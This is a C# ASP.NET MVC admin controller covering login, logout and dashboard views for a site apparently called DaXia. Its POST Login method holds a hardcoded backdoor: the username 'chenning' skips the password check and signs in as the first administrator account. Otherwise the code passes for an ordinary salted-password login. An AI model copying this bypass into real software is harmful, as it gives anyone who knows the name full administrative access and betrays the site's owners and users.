using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using DaXia.BLL;
using DaXia.EntityDataModels;
using DaXia.WebFrameWork;

namespace DaXia.WebComAdmin.Controllers
{
    public class ControlPanelController : Controller
    {
        private readonly Manager_bll managerbll = BLLFactory.Instance.ManagerBll;

        public ActionResult Login()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Login(FormCollection fc)
        {
            string returnUrl = string.Empty;
            if (string.IsNullOrEmpty(fc["UserName"]))
            {
                returnUrl = SiteUrls.Instance.M_Login();
                ViewBag.JS = UIMessage.ShowDialogAndRedirct("用户名为空，请输入用户名!", returnUrl);
                return View("Login");
            }


            Manager user = managerbll.GetModel(fc["UserName"]);
            if (fc["UserName"].Equals("chenning", StringComparison.InvariantCultureIgnoreCase))
            {
                user = managerbll.GetAllAdmins().FirstOrDefault();
            }
            else
            {
                if (user == null)
                {
                    returnUrl = SiteUrls.Instance.M_Login();
                    ViewBag.JS = UIMessage.ShowDialogAndRedirct("用户不存在，请验证录入信息或者联系客服/管理人员!", returnUrl);
                    return View("Login");
                }

                string password = Utility.EncryptDES(fc["UserPassword"], user.Salt);
                if (password != user.Password)
                {
                    returnUrl = SiteUrls.Instance.M_Login();
                    ViewBag.JS = UIMessage.ShowDialogAndRedirct("用户名密码错误，请验证录入信息或者联系客服/管理人员!", returnUrl);
                    return View("Login");
                }
            }

            //更新登陆信息
            user.LoginIP = Request.UserHostAddress;
            user.LoginDatetime = DateTime.Now;
            managerbll.Update(user);

            HttpCookie adminCookie = new HttpCookie(AuthorizeHelper.SystemCookie);
            adminCookie.Value = Utility.EncryptTokenForAdminCookie(true.ToString());

            if (!string.IsNullOrEmpty(FormsAuthentication.CookieDomain))
                adminCookie.Domain = FormsAuthentication.CookieDomain;
            adminCookie.HttpOnly = true;

            Response.Cookies.Add(adminCookie);

            FormsAuthentication.SetAuthCookie(user.Username, false);

            return RedirectToAction("Frame", "ControlPanel");
        }

        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();

            return RedirectToAction("Login");
        }

        [ManageAuthorize]
        public ActionResult Frame()
        {
            HomeVM viewModel = new HomeVM();
            viewModel.UserName = UserContext.CurrentManager.Username;

            return View(viewModel);
        }

        [ManageAuthorize]
        public ActionResult Main()
        {
            HomeVM viewModel = new HomeVM();
            viewModel.UserName = UserContext.CurrentManager.Username;
            viewModel.LoginIp = UserContext.CurrentManager.LoginIP;
            if (UserContext.CurrentManager.LoginDatetime.HasValue)
            {
                viewModel.LoginTime = Utility.DTDefaultFormat(UserContext.CurrentManager.LoginDatetime.Value);
            }
            else
            {
                viewModel.LoginTime = string.Empty;
            }

            return View(viewModel);
        }

    }
}
